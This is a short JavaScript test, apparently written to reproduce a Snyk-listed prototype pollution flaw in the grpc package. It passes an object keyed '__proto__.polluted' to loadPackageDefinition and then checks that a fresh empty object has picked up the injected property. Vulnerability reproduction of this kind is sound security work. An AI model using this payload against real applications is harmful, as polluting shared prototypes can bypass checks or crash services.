//https://snyk.io/vuln/SNYK-JS-GRPC-598671
test("prototype pollution in grpc", () => {
  expect({}.polluted).toBe(undefined);

  const { loadPackageDefinition } = require("grpc");
  loadPackageDefinition({ "__proto__.polluted": true });

  expect({}.polluted).not.toBe(undefined);
});
